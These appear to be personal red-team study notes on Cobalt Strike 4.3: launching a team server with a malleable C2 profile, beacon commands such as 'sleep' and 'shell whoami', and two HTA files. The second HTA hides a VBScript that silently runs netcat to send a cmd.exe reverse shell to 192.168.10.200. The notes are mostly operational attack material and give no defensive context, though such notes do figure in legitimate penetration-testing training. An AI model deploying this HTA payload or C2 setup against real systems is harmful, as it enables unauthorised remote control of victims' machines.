### How to start cobalt strike 4.3 ?
1. First start team server `./teamserver <KALI IP> <some password> <some C2 malleable profile>`
2. First start team server `./teamserver 192.168.10.200 password123 havex.profile`
3. Then `./start.sh`

### Useful commands for CS 4.3?
1. Change beacon time `sleep <digit number>`
2. E.g Change beacon time to 02 seconds `sleep 2`
3. Run commands via cmd.exe `shell <some command>`
4. E.g `shell dir` or `shell whoami`

### .hta file execution (requres Internet Explorer) 01 - Simple Hello World
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>
</html>
```
### .hta file execution (requres Internet Explorer) 02 - Get reverse shell "console" is hidden
```
<html>
  <head>
    <title>Reverse Shell</title>
  </head>
  <body>
    <h2>get reverse shell on 192.168.10.200 at port 00</h2>
    <p>This is a HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      Shell.Run "cmd /c C:\Users\jon\Desktop\crtoStuff\nc.exe -e cmd.exe 192.168.10.200 200", 0, True
    End Function

    Pwn
  </script>
</html>
```
